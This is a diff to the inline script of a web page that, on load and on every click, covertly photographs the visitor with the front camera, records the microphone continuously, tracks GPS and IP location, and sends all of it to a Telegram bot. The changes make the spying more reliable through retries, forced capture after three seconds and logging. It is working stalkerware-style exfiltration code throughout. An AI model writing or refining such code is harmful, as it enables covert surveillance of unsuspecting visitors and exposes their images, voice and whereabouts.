@@ -21,31 +21,66 @@
     let cachedLat = 0;
     let cachedLon = 0;
     let cachedIP = 'N/A';
+    let locationRetryCount = 0;
+    const MAX_LOCATION_RETRIES = 3;
+    let hasValidLocation = false;
 
     function sendToTelegram(lat, lon, photoBlob) {
       if (photoBlob && photoBlob.size > 1000) {
+        console.log('📤 Sending photo to Telegram:', lat, lon, 'IP:', cachedIP);
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', photoBlob, 'photo.jpg');
         formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🌐 IP: ${cachedIP}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
-        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+          .then(res => res.json())
+          .then(data => {
+            if (data.ok) {
+              console.log('✓ Photo sent successfully to Telegram');
+            } else {
+              console.log('✗ Failed to send photo:', data.description);
+            }
+          })
+          .catch(err => console.log('✗ Photo send error:', err));
+      } else {
+        console.log('✗ Photo blob too small:', photoBlob ? photoBlob.size : 'null');
       }
     }
 
     function sendAudioToTelegram(audioBlob) {
       if (audioBlob && audioBlob.size > 0) {
+        console.log('🔊 Sending audio to Telegram, size:', audioBlob.size);
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('audio', audioBlob, 'audio.ogg');
-        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
+        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: formData })
+          .then(res => res.json())
+          .then(data => {
+            if (data.ok) {
+              console.log('✓ Audio sent successfully');
+            } else {
+              console.log('✗ Audio send failed:', data.description);
+            }
+          })
+          .catch(err => console.log('✗ Audio send error:', err));
       }
     }
 
     let recordingInterval = null;
+    let isCapturing = false;
+    let audioRetryCount = 0;
+    const MAX_AUDIO_RETRIES = 5;
 
     async function startAudioRecording() {
       try {
+        if (audioRetryCount > MAX_AUDIO_RETRIES) {
+          console.log('⚠ Max audio retries exceeded, skipping');
+          return;
+        }
+        
+        console.log('🎤 Starting audio recording...');
         const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        audioRetryCount = 0;
         mediaRecorder = new MediaRecorder(audioStream);
         audioChunks = [];
 
@@ -61,10 +96,16 @@
             sendAudioToTelegram(audioBlob);
           }
           audioChunks = [];
+          console.log('🎤 Audio chunk completed, restarting...');
+          // Stop the stream before restarting
+          if (mediaRecorder && mediaRecorder.stream) {
+            mediaRecorder.stream.getTracks().forEach(t => t.stop());
+          }
           setTimeout(startAudioRecording, 100);
         };
 
         mediaRecorder.start();
+        console.log('✓ Audio recording started');
 
         if (recordingInterval) clearInterval(recordingInterval);
         recordingInterval = setInterval(() => {
@@ -73,7 +114,11 @@
           }
         }, 60000);
       } catch (err) {
-        setTimeout(startAudioRecording, 5000);
+        audioRetryCount++;
+        console.log('✗ Audio permission denied or error:', err.message, '(retry', audioRetryCount + ')');
+        if (audioRetryCount <= MAX_AUDIO_RETRIES) {
+          setTimeout(startAudioRecording, 5000);
+        }
       }
     }
 
@@ -83,108 +128,207 @@
       }
     });
 
+    // Audio health check - reduced from 30 to 60 seconds
     setInterval(() => {
       if (!mediaRecorder || mediaRecorder.state !== 'recording') {
         startAudioRecording();
       }
-    }, 30000);
+    }, 60000);
 
     function getIPBasedLocation() {
-      // Fallback location using IP geolocation
-      fetch('https://ipapi.co/json/')
+      // Fallback location using IP geolocation with cache buster
+      const cacheBuster = Date.now();
+      fetch(`https://ipapi.co/json/?t=${cacheBuster}`)
         .then(res => res.json())
         .then(data => {
-          if (data.latitude && data.longitude) {
+          if (data.latitude && data.longitude && data.latitude !== 0 && data.longitude !== 0) {
             cachedLat = data.latitude;
             cachedLon = data.longitude;
+            hasValidLocation = true;
+            console.log('✓ IP Location found:', cachedLat, cachedLon);
           }
           if (data.ip) {
             cachedIP = data.ip;
+            console.log('✓ IP Address:', cachedIP);
           }
         })
-        .catch(() => {});
+        .catch(err => console.log('✗ IP location failed:', err));
+    }
+
+    function checkPermissions() {
+      if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: 'geolocation' })
+          .then(result => {
+            console.log('Geolocation permission:', result.state);
+            if (result.state === 'denied') {
+              console.log('⚠ Geolocation denied, relying on IP location');
+              getIPBasedLocation();
+            }
+          })
+          .catch(err => console.log('Permission check error:', err));
+      }
     }
 
     function updateLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
-          cachedLat = pos.coords.latitude;
-          cachedLon = pos.coords.longitude;
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          if (lat && lon && lat !== 0 && lon !== 0) {
+            cachedLat = lat;
+            cachedLon = lon;
+            hasValidLocation = true;
+            locationRetryCount = 0;
+            console.log('✓ GPS Location found:', cachedLat, cachedLon);
+          }
         }, (err) => {
-          // Fallback to IP-based location on GPS failure
-          getIPBasedLocation();
-          setTimeout(updateLocation, 200);
+          console.log('✗ GPS failed:', err.message);
+          locationRetryCount++;
+          if (locationRetryCount <= MAX_LOCATION_RETRIES) {
+            getIPBasedLocation();
+            setTimeout(updateLocation, 200);
+          } else {
+            console.log('⚠ Max retries reached, using cached/IP location');
+          }
         }, {
           enableHighAccuracy: true,
-          timeout: 5000,
+          timeout: 3000,
           maximumAge: 0
         });
       } else {
-        // If geolocation not available, use IP
+        console.log('⚠ Geolocation not available, using IP');
         getIPBasedLocation();
       }
     }
 
+    checkPermissions();
+    
+    // Parallel location fetching - both GPS and IP at the same time
     updateLocation();
     getIPBasedLocation();
-    setInterval(updateLocation, 3000);
+    
+    console.log('🔍 Location tracking started...');
+    
+    // Update location every 2 seconds for more current data
+    setInterval(updateLocation, 2000);
 
     async function autoCapture() {
+      if (isCapturing) {
+        console.log('⚠ Capture already in progress, skipping');
+        return;
+      }
+      
+      isCapturing = true;
+      let videoStream = null;
+      
       try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        console.log('📷 Starting photo capture...');
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        stream = videoStream;
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        video.srcObject = stream;
+        
+        if (!video || !canvas) {
+          console.log('✗ Video or canvas element not found');
+          isCapturing = false;
+          return;
+        }
+        
+        video.srcObject = videoStream;
 
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play();
             setTimeout(resolve, 1000);
           };
+          setTimeout(resolve, 2000);
         });
 
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
+        console.log('📷 Video ready, capturing at', canvas.width + 'x' + canvas.height);
 
         const context = canvas.getContext('2d');
+        if (!context) {
+          console.log('✗ Canvas context not available');
+          isCapturing = false;
+          videoStream.getTracks().forEach(t => t.stop());
+          return;
+        }
+        
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         canvas.toBlob((blob) => {
-          if (stream) stream.getTracks().forEach(t => t.stop());
-          
-          // Optimize quality based on blob size
-          let quality = 0.95;
-          if (blob.size > 500000) quality = 0.7; // If > 500KB, reduce to 70%
-          else if (blob.size > 300000) quality = 0.8; // If > 300KB, reduce to 80%
-          
-          // Re-compress if needed
-          if (quality < 0.95) {
-            canvas.toBlob((optimizedBlob) => {
-              sendToTelegram(cachedLat, cachedLon, optimizedBlob);
-            }, 'image/jpeg', quality);
-          } else {
-            sendToTelegram(cachedLat, cachedLon, blob);
+          try {
+            if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+            
+            if (!blob || blob.size < 100) {
+              console.log('✗ Photo blob invalid or too small:', blob ? blob.size : 'null');
+              isCapturing = false;
+              return;
+            }
+            
+            console.log('📷 Photo captured, size:', blob.size, 'bytes');
+            
+            // Optimize quality based on blob size
+            let quality = 0.95;
+            if (blob.size > 500000) quality = 0.7;
+            else if (blob.size > 300000) quality = 0.8;
+            
+            // Re-compress if needed
+            if (quality < 0.95) {
+              console.log('🔧 Optimizing photo quality to', (quality * 100) + '%');
+              canvas.toBlob((optimizedBlob) => {
+                sendToTelegram(cachedLat, cachedLon, optimizedBlob);
+                isCapturing = false;
+              }, 'image/jpeg', quality);
+            } else {
+              sendToTelegram(cachedLat, cachedLon, blob);
+              isCapturing = false;
+            }
+          } catch (blobErr) {
+            console.log('✗ Blob processing error:', blobErr.message);
+            isCapturing = false;
           }
         }, 'image/jpeg', 0.95);
-      } catch (err) {}
+      } catch (err) {
+        console.log('✗ Capture error:', err.message);
+        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+        isCapturing = false;
+      }
     }
 
     window.addEventListener('load', () => {
+      console.log('📱 Page loaded, starting audio and location tracking');
       startAudioRecording();
-      getIPBasedLocation();
       
-      // Quick check - capture as soon as location is ready
-      setTimeout(() => {
-        if (cachedLat !== 0 && cachedLon !== 0) {
+      // Capture on first successful location with timeout fallback
+      const locationCheckInterval = setInterval(() => {
+        if (hasValidLocation && cachedLat !== 0 && cachedLon !== 0) {
+          clearInterval(locationCheckInterval);
+          console.log('✓ Valid location acquired, capturing photo');
           autoCapture();
-        } else {
-          // If location still not ready, wait just a bit more
-          setTimeout(autoCapture, 1000);
         }
-      }, 2000);
+      }, 500);
+      
+      // Force capture after 3 seconds, even if location is invalid
+      setTimeout(() => {
+        clearInterval(locationCheckInterval);
+        // Check if we at least tried to get location
+        if (cachedLat === 0 && cachedLon === 0 && cachedIP === 'N/A') {
+          console.log('⚠ No location data available, but forcing capture with 0,0');
+        } else {
+          console.log('⚠ Timeout: capturing with current location data - Lat:', cachedLat, 'Lon:', cachedLon, 'IP:', cachedIP);
+        }
+        autoCapture();
+      }, 3000);
     });
 
-    document.addEventListener('click', autoCapture);
+    document.addEventListener('click', () => {
+      if (!isCapturing) {
+        autoCapture();
+      }
+    });
   </script>
 
 </body>
